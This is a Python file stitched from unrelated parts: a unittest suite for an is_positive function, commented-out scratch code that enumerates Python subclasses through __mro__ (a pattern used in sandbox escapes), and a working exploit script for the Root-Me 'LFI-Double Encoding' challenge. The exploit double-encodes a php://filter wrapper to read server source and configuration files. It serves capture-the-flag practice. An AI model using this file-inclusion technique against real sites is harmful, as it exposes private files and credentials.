from isPositiveFunc import is_positive  
import unittest

# Inherit functionality from the TestCase class located in the unit test module.
class test_positive_func(unittest.TestCase):
   def test_basic(self):
      test_case = 5
      expected = f"{test_case} is a positive number." 
      self.assertEqual(is_positive(test_case), expected)    
   
   def test_negative(self):
      test_case = -4
      expected = f"{test_case} is a negative number." 
      self.assertEqual(is_positive(test_case), expected)
      
   def test_zero(self):
      test_case = 0
      expected = "It is zero." 
      self.assertEqual(is_positive(test_case), expected)      
# Run the test. 
unittest.main()               

# test = "".__class__.__mro__[1].__subclasses__()
# import namespace
# test = namespace.__builtins__

# print(test)
# print(len(test)) # 189
# print(test[2]) # <class 'int'>
# print(type(test[2]))

# count = 0
# for i in test:
#     print(f"Index {count} : {i} \n")
#     count+=1    

# import sys
# print( 40 * "-")
# print(sys.version.split()[0])
# print( 40 * "-")

# print('summer', 'time', 'holiday', sep='#')

# Solution for LFI-Double Encoding from Rootme. 
#!/usr/bin/python
import os
import sys
import requests
from base64 import b64decode

def double_encode (string):
   encoded = ''
   for char in string:
       encoded += '%25' + '%02x' % ord (char)
   return encoded

def get_file (path):
   encoded_path = double_encode('php://filter/convert.base64-encode/resource=' + path)
   response = requests.get('http://challenge01.root-me.org/web-serveur/ch45/index.php?page=' + encoded_path)
   print (b64decode(response.text))

get_file ('cv')
get_file ('conf')
